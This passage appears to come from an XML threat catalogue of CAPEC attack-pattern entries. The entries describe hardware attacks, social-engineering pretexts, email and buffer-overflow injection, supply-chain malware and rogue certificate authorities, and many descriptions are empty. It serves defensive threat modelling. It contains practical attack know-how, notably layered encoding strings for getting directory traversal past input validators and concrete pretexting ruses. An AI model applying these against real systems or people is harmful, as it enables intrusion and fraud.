  <description>An attacker exploits weaknesses in the physical hardware of a machine in order to gain unauthorized access to the device or system. Hacking hardware devices falls into several broad categories depending upon the relative sophistication of the attacker and the type of systems that are targeted. Attacks against hardware devices differ from software attacks in that hardware-based attacks target the chips, circuit boards, device ports, or other components that comprise a computer system or embedded system. The most common hardware devices which are attacked are computer systems such as laptops, desktops and server platforms. Simple attacks may range from inserting an unauthorized USB drive into a system or using a Boot disk or CD to gain access to an unprotected system. Other more sophisticated attacks may involve adding or removing jumpers to an exposed system, or applying sensors to portions of the motherboard to read dataas it traverses the system bus.</description>
</threat>
<threat label="CAPEC-402" name="Bypassing ATA Password Security" type="Detailed" reference="CAPEC">
  <description>An attacker exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.</description>
</threat>
<threat label="CAPEC-403" name="Social Engineering Attacks" type="Meta" reference="CAPEC">
  <description>An attacker manipulates people into performing actions or divulging confidential information, as well as possible access to computer systems or facilities. While similar to a confidence trick or simple fraud, the term typically applies to trickery or deception for the purpose of information gathering, fraud, or computer system access; in most cases the attacker never comes face-to-face with the victim</description>
</threat>
<threat label="CAPEC-404" name="Social Information Gathering Attacks" type="Meta" reference="CAPEC">
  <description>An attacker employs various means of gathering information about a target company, organization, or person. These techniques may range from using telephones, gathering trash or other discarded information, intrusion within company property, using the Internet for research, to querying individuals under false or misleading pretenses. A social engineer can use many small pieces of information to combine into a useful vulnerability of a system. Information can be important whether it comes from the janitor’s office or from the CEO’s office; each piece of paper, employee spoken to or area visited by the social engineer can add up enough information to attain access to sensitive data and resources of the company. The lesson here is all information, no matter how insignificant the employee believes it to be, may assist in creating a vulnerability for a company and an entrance for a social engineer. While the ultimate goal of the attacker may vary the purpose of these attacks is usually to gain access to computer systems or facilities.</description>
</threat>
<threat label="CAPEC-405" name="Social Information Gathering via Research" type="Meta" reference="CAPEC">
  <description>An attacker employs various methods of information gathering to collect a body of information that facilitates the attacker's goals toward the target organization. Because an attacker's goals can vary so widely during this phase there is no one particular methodology that is often employed. During the research phase, for example, an attacker could use a company's automated directory service via the telephone to identify individuals in key positions of authority. Other methods could involve casing an establishment during high traffic hours to determine how strictly employees monitor who is entering the building behind them or something as simple as internet searching. Gathering information to support social engineering exercises is much the same as research you do for anything else. You need a goal in mind when you start in order to keep the research focused. Having a clear objective helps you determine what information is relevant to the end goal and what can be ignored. This holds true not only for the information gathered but also for how it's gathered.</description>
</threat>
<threat label="CAPEC-406" name="Social Information Gathering via Dumpster Diving" type="Meta" reference="CAPEC">
  <description>An attacker cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more. By collecting this information an attacker may be able to learn important facts about the person or organization that play a role in helping the attacker in their attack.</description>
</threat>
<threat label="CAPEC-407" name="Social Information Gathering via Pretexting" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the attacker's interests. During a pretexting attack the attacker creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie, in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information. Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. Basic pretexting attacks may simply seek to learn information about a target, but more complicated pretexting attacks seek to solicit a target to perform some action that assists the attacker in exploiting organizational weaknesses or obtaining access to secure facilities or systems. One example of a pretexting attack could be to dress up like a jogger and run in place by the entrance of a building, pretending to look for your access card. Because the hood obscures you face, it may be possible to solicit someone inside the building to let you inside. Pretexting is also not a one-size fits all solution. A social engineering attacker will have to develop many different pretexts over their career. All of them will have one thing in common, research. Good information gather techniques can make or break a good pretext. Being able to mimic the perfect tech support rep is useless if the target does not use outside support. Pretexting is also used in other areas of life other than social engineering. Sales, public speaking, so-called fortune tellers, NLP experts and even doctors, lawyers, therapists and the like all have to use a form of pretexting. They all have to create a scenario where a person is comfortable with releasing information they normally would not. One of the most important aspects of social engineering is trust. If the attacker cannot build trust they will most likely fail. A solid pretext is an essential part of building trust. If an attacker's alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on. Similar to inserting the proper key in a lock, the right pretext provides the proper cues to those around the attacker and can disarm their suspicions or doubts and open up the doors, so to speak. .</description>
</threat>
<threat label="CAPEC-408" name="Information Gathering from Traditional Sources" type="Meta" reference="CAPEC">
  <description>An attacker engages in information gathering activities from traditional sources which are typically open, publicly available sources of information that don't require any illegal activity to obtain.. Tradition sources can include corporate websites, DNS (Domain Name Service) records, or even social media sites such as blogs or wikis. The goal is to collect as much information as possible so as to construct a accurate model that aids the attacker in conducting further social engineering attacks.</description>
</threat>
<threat label="CAPEC-409" name="Information Gathering from Non-Traditional Sources" type="Meta" reference="CAPEC">
  <description>An attacker uses sources of information which are less obvious and often overlooked to learn about the target person or organization. These sources could be industry experts or insiders who might reveal key pieces of information that help the attacker determine possible social engineering vulnerabilities in the target. Other types of oblique information gathering might be to case or stalk particular employees to find out popular after work venues. The attacker would then visit that venue and sit in close proximity to the target individuals to gather information.</description>
</threat>
<threat label="CAPEC-41" name="Using Meta-characters in E-mail Headers to Inject Malicious Payloads" type="Detailed" reference="CAPEC">
  <description>This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs.Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can containt scripts, enumerations, probes, and other attacks against the user's system.An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.Manually tampering email headers to inject malicious metacharacter-based payload content in them.The email client processes metacharacters in email headers.The email client does not process metacharacters in email headers.The email server will strip the headers that contain metacharactersThe email server lets the malicious metacharacters in the email headers.An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.Send emails with specifically-constructed, metacharater-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-410" name="Information Elicitation via Social Engineering" type="Meta" reference="CAPEC">
  <description>An attacker engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.</description>
</threat>
<threat label="CAPEC-411" name="Pretexting" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the attacker's interests. Pretexting involves a mixture of role-play, subterfuge, and possibly some forms of disguise. Basic pretexting attacks may simply seek to learn information about a target, but more complicated pretexting attacks seek to solicit a target to perform some action that assists the attacker in exploiting organizational weaknesses or obtaining access to secure facilities or systems. One example of a pretexting attack could be to dress up like a jogger and run in place by the entrance of a building, pretending to look for your access card. Because the hood obscures you face, it may be possible to solicit someone inside the building to let you inside.</description>
</threat>
<threat label="CAPEC-412" name="Pretexting via Customer Service" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the attacker's interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.</description>
</threat>
<threat label="CAPEC-413" name="Pretexting via Tech Support" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the attacker's interests. An attacker who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an attacker physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.</description>
</threat>
<threat label="CAPEC-414" name="Pretexting via Delivery Person" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the attacker's interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and &quot;deliveries&quot; in order to be able to pull it off.</description>
</threat>
<threat label="CAPEC-415" name="Pretexting via Phone" type="Meta" reference="CAPEC">
  <description>An attacker engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the attacker's interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.</description>
</threat>
<threat label="CAPEC-416" name="Target Influence via Social Engineering" type="Meta" reference="CAPEC">
  <description>An attacker exploits inherent human psychological predispositions to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the attacker's interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled attacker uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the attacker's speech and thought patterns.</description>
</threat>
<threat label="CAPEC-417" name="Target Influence via Perception of Reciprocation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-418" name="Target Influence via Perception of Obligation" type="Meta" reference="CAPEC">
  <description>An attacker uses a social engineering technique to produce a sense of obligation within the target to volunteer some key or sensitive piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. In the context of social engineering, obligation is closely related to reciprocation but is not limited to it. There are various techniques for producing a sense of obligation during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily. It can also be as simple as holding an outer door for someone will usually make them hold the inner door for you. It can be escalated to someone giving you private info because you create a sense of obligation. This is a common attack vector when targeting customer service people.</description>
</threat>
<threat label="CAPEC-419" name="Target Influence via Perception of Concession" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-42" name="MIME Conversion" type="Detailed" reference="CAPEC">
  <description>An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).Identify places in the system where vulnerable MIME conversion routines may be used.Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shellcode.The first step is to figure what mail server (and what version) is running on the target system.</description>
</threat>
<threat label="CAPEC-420" name="Target Influence via Perception of Scarcity" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-421" name="Target Influence via Perception of Authority" type="Meta" reference="CAPEC">
  <description>An attacker uses a social engineering technique to convey a sense of authority that motivates the target reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization an attacker may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the attacker.</description>
</threat>
<threat label="CAPEC-422" name="Target Influence via Perception of Commitment and Consistency" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-423" name="Target Influence via Perception of Liking" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-424" name="Target Influence via Perception of Consensus or Social Proof" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-425" name="Target Influence via Framing" type="Meta" reference="CAPEC">
  <description>An attacker uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the attacker's point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the attacker's perspective. One technique of framing is to avoid the use of the word &quot;No&quot; and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the attacker.</description>
</threat>
<threat label="CAPEC-426" name="Target Influence via Manipulation of Incentives" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-427" name="Target Influence via Psychological Principles" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-428" name="Target Influence via Modes of Thinking" type="Meta" reference="CAPEC">
  <description>An attacker attunes their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the attacker has adapted their communication forms to match those of the target. When skillfully employed the target is likely to be unaware that they are being manipulated.</description>
</threat>
<threat label="CAPEC-429" name="Target Influence via Eye Cues" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-43" name="Exploiting Multiple Input Interpretation Layers" type="Standard" reference="CAPEC">
  <description>An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a &quot;layer&quot; of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps.The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: &lt;parser1&gt; --&gt; &lt;input validator&gt; --&gt; &lt;parser2&gt;. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where he/she wants to bypass it.While using an application/system, the attacker discovers an input where validation is stopping him/her from performing some malicious or unauthorized actions.When provided with unexpected input, application provides an error message stating that the input was invalid or that access was denied.The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '\'Determine whether URL encoding is accepted by the application/system.Determine whether UTF-8 encoding is accepted by the application/system.Determine whether UTF-16 encoding is accepted by the application/system.Determine if any other encodings are accepted by the application/system.System provides error message similar to the one it provided when a positivie indicator was received for the first step.The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: &quot;\\\.&quot;. With two parsing layers, this may get converted to &quot;\.&quot; after the first parsing layer, and then, to &quot;.&quot; after the second. If the input validation layer is between the two parsing layers, then &quot;\\\.\\\.&quot; might pass a test for &quot;..&quot; but still get converted to &quot;..&quot; afterwards. This may enable directory traversal attacks.Combine multiple encodings and observe the effects. For example, the attacker might encode &quot;.&quot; as &quot;\.&quot;, and then, encode &quot;\.&quot; as &quot;&amp;#92;&amp;#46;&quot;, and then, encode that using URL encoding to &quot;%26%2392%3B%26%2346%3B&quot;Application/System interprets the multiple encodings properly.Attacker leverages his ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.Gain access to sensitive files.Perform command injection.Perform SQL injection.Perform XSS attacks.Success outcome in previous stepFailure outcome in previous stepInitially a fuzzer can be used to see what the application is successfully and escaping and what causes problems. This may be a good starting point.Manually try to introduce multiple layers of control characters and see how many layers the application can escape.Control characters are being detected by the filters repeatedly.</description>
</threat>
<threat label="CAPEC-430" name="Target Influence via Micro-Expressions" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-431" name="Target Influence via Neuro-Linguistic Programming (NLP)" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-432" name="Target Influence via Voice in NLP" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-433" name="Target Influence via The Human Buffer Overflow" type="Meta" reference="CAPEC">
  <description>An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on overstimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message. The fundamental difference is that embedded messages have a complete semantic quality, rather than mere imagery, and the mind of the target tends to key off of particular dominant patterns. The remaining information, carefully structured, speaks directly to the subconscious with a subtle, indirect, command. The effect is to produce a pattern of thinking that the attacker has predetermined but is buried within the message and not overtly stated. Structuring a human &quot;buffer overflow&quot; requires precise attention to detail and the use of information in a manner that distracts the conscious mind from the message the subconscious is receiving.</description>
</threat>
<threat label="CAPEC-434" name="Target Influence via Interview and Interrogation" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-435" name="Target Influence via Instant Rapport" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-437" name="Supply Chain Attacks" type="Meta" reference="CAPEC">
  <description>An attacker disrupts the supply chain lifecycle by manipulating computer system hardware, software, or services for the purpose of espionage, theft of critical data or technology, or to disrupt mission-critical operations or infrastructure. Supply chain operations are usually multi-national with parts, components, assembly, and delivery occurring in countries outside the United States. The economics of computer crime are increasingly favoring supply chain attacks as data theft and extortion, theft of technology covered by export controls, and industrial espionage can be carried out through modifications in technologies typically regarded as harmless. Manipulating a technology, component, or product, such as USB Thumb Drive, digital camera, or digital projector can provide a direct means for compromising targeted organizations with very little risk to the attacker.</description>
</threat>
<threat label="CAPEC-438" name="Integrity Modification/Manipulation During Manufacture" type="Meta" reference="CAPEC">
  <description>An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.</description>
</threat>
<threat label="CAPEC-439" name="Integrity Modification during Distribution" type="Meta" reference="CAPEC">
  <description>An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threats of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging. A malicious OEM provider may install software, or modify existing code, during distribution. Additionally, external contractors may be involved in the packaging or testing of products or components, granting another window of opportunity to modify or undermine the integrity of the technology.</description>
</threat>
<threat label="CAPEC-44" name="Overflow Binary Resource File" type="Detailed" reference="CAPEC">
  <description>An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may includes music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the attacker access to the execution stack and execute arbitrary code in the target process. This attack pattern is a variant of standard buffer overflow attacks using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The attacker is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application, for the victim to download. The attacker then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.</description>
</threat>
<threat label="CAPEC-440" name="Integrity Modification During Deployed Use" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-441" name="Malicious Logic Inserted Into Product" type="Standard" reference="CAPEC">
  <description>An attacker inserts malicious logic into a product at some point during the supply chain lifecycle. Very often it is difficult to detect when the malicious modifications took place because of the complex nature of supply chain dynamics. One common example of malicious logic embedded into a product concerns USB Memory sticks shipping with viruses or trojans, infecting the host machine once they are inserted into the port.</description>
</threat>
<threat label="CAPEC-442" name="Malicious Logic Inserted Into Product Software" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-443" name="Malicious Logic Inserted Into Product Software by Authorized Developer" type="Standard" reference="CAPEC">
  <description>An attacker uses their privileged position within an authorized software development organization to inject malicious logic into a codebase or product. Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In other cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by hackers.</description>
</threat>
<threat label="CAPEC-444" name="Malicious Logic Insertion into Product Software via Externally Manipulated Component" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-445" name="Malicious Logic Insertion into Product Software via Configuration Management Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an attacker can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an attacker can control elements of a product's ongoing operational configuration management baseline they can potentially force clients recieving updates from the system to install insecure software when recieving updates from the server. Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an attacker who has compromised the server can alter the software baseline that clients must install, allowing the attacker to compromise a large number of satallite machines using the configuration management system. If an attacker can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place.</description>
</threat>
<threat label="CAPEC-446" name="Malicious Logic Insertion into Product Software via Inclusion of 3rd Party Component Dependency" type="Standard" reference="CAPEC">
  <description>An attacker conducts supply chain attacks by the inclusion of insecure 3rd party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer. The result is a window of opportunity for exploiting the product or software until the insecure component is discovered. This supply chain threat can result in the installation of software that introduces widespread security vulnerabilities within an organization. One exampple could be the inclusion of an exploitable DLL (Dynamnic Link Library) included within an antivirus technology. Because software often depends upon a large number of interdependent libraries and components to be be present, security holes can be introduced merely by installing COTS software that comes pre-packaged with the components required for it to operate.</description>
</threat>
<threat label="CAPEC-447" name="Malicious Logic Insertion into Product Software during Update" type="Standard" reference="CAPEC">
  <description>An attacker manipulates the codebase provided in a software patch, firmware version, or product update to contain malicious code. This results in devices, products, or software downloading and executing the attacker's code, or the code is introduced when the user upates the BIOS of a device. A malicious software update can perform any range of actions, depending on the attacker's intent. Of greatest concern are compromised updates that introduce logic bombs, deliberately hidden backdoors or rootkits, self-modifying code, keyloggers, or other means of gaining direct access to an organization's internal network.</description>
</threat>
<threat label="CAPEC-448" name="Malware Infection into Product Software" type="Detailed" reference="CAPEC">
  <description>An attacker tampers with the code of a product and injects malicious logic into the device in order to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop. With the proliferation of mass digital storage and inexpensive multimedia devices, bluetooth and 802.11 support, new attack vectors for spreading malware are emereging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors becomes important vectors of attack.</description>
</threat>
<threat label="CAPEC-449" name="Malware Propagation via USB Stick" type="Detailed" reference="CAPEC">
  <description>An attacker loads malicious code onto a USB memory stick in order to infect any supply chain-relevant machine which the device is plugged in to. This initially infected machine could then propogate the infection to products moving through the supply chain process. USB drives present a significant security risk for business and governmnent agencies. Given the ability to integrate wireless functionality into a USB stick, its possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship.</description>
</threat>
<threat label="CAPEC-45" name="Buffer Overflow via Symbolic Links" type="Detailed" reference="CAPEC">
  <description>This type of attack leverages the use of symbolic links to cause buffer overflows. An attacker can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.The attacker creates or modifies a symbolic link pointing to a resources (e.g., file, directory). The content of the symbolic link file includes out-of-bounds (e.g. excessive length) data.The target host consumes the data pointed to by the symbolic link file. The target host may either intentionally expect to read a symbolic link or it may be fooled by the replacement of the original resource and read the attacker's symbolic link.While consuming the data, the target host does not check for buffer boundary which can lead to a buffer overflow. If the content of the data is controlled by the attacker, this is an avenue for remote code execution.The attacker will look for temporary files in the world readable directories. Those temporary files are often created and read by the system.The attacker will look for Symbolic link or link target file that she can overide.An attacker creating or modifying Symbolic links is a potential signal of attack in progress.An attacker deleting temporary files can also be a sign that the attacker is trying to replace legitimate resources with malicious ones.The most common is remote code execution.</description>
</threat>
<threat label="CAPEC-450" name="Malware Propagation via USB U3 Autorun" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-451" name="Malware Propagation via Infected Peripheral Device" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-452" name="Malicious Logic Insertion into Product Hardware" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-453" name="Malicious Logic Insertion via Counterfeit Hardware" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-454" name="Modification of Existing Components with Counterfeit Hardware" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-455" name="Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components" type="Detailed" reference="CAPEC">
  <description>An attacker produces counterfeit hardware components which are included in product assembly during some portion of the supply chain lifecycle. The production of products containing counterfeit components such as counterfeit routers, switches, ethernet, as well as WAN (Wide Area Networking) cards results in the aqcuirer obtaining a device specifically designed for malicious purposes. The problem of counterfiet hardware is not limited to small or &quot;one-off&quot; vendors, but has included major trusted suppliers, such as Cisco. There are billions of transistors in a single integrated circuit and researchedrs have shown that fewer than 10 transistors are required to create malicious functionality, such as keylogging or password theft.</description>
</threat>
<threat label="CAPEC-456" name="Malicious Logic Insertion into Product Memory" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-457" name="USB Memory Attacks" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-458" name="Flash Memory Attacks" type="Detailed" reference="CAPEC">
  <description>An attacker inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device. Such attacks are very difficult to detect because the malicious code resides outside the filesystem or RAM, and in the underlying byte-code that drives the processeor. Many devices, such as the recent attacks against digital picture frames, contain only a microproceseor and a small amount of solid-state memory, rendering these devices ideal for &quot;flash&quot; based malware or malicious logic. One of the pernicious characteristics of flash memory based attacks is that the malicious code can survive even a total format of the hard-drive and reinstallation of the host operatig system. Virtually any device which can be integrated into a computer system is susceptible to these attacks. Additionally, any peripheral device which interfaces with the computer bus could extract or sniff confidential data, even on systems employing full-disk encryption. Trojan code placed into a video card's chipset would continue to perform its function irrespective of the host operating system, and would be invisible to all known antivirus. The threats extend to consumer products such as camcorders, digital cameras, or any consumer electronic device with an embedded microcontroller.</description>
</threat>
<threat label="CAPEC-459" name="Creating a Rogue Certificate Authority Certificate" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in the MD5 hash algorithm (weak collision resistance) to generate a certificate signing request (CSR) that contains collision blocks in the &quot;to be signed&quot; part. The attacker specially crafts two different, but valid X.509 certificates that when hashed with the MD5 algorithm would yield the same value. The attacker then sends the CSR for one of the certificates to the Certification Authority which uses the MD5 hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the attacker which is signed with its private key. An attacker then takes that signed blob and inserts it into another X.509 certificate that the attacker generated. Due to the MD5 collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate.The net effect is that the attacker's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority. To make the attack more interesting, the second certificate could be not just a regular certificate, but rather itself a signing certificate. Thus the attacker is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Ceritifcation Authority that has signed the attacker's first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will now the Certifiate Authority set up by the attacker and of course any certificates that it signs. So the attacker is now able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec) .</description>
</threat>
<threat label="CAPEC-46" name="Overflow Variables and Tags" type="Detailed" reference="CAPEC">
  <description>This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The attacker crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.The attacker modifies a tag or variable from a formatted configuration data. For instance she changes it to an oversized string.The target program consumes the data modified by the attacker without prior boundary checking. As a consequence, a buffer overflow occurs and at worst remote code execution may follow.An attacker can modify the variables and tag exposed by the target program.An attacker can automate the probing by input injection with script or automated tools.The most common is remote code execution.</description>
</threat>
<threat label="CAPEC-460" name="HTTP Parameter Pollution (HPP)" type="Detailed" reference="CAPEC">
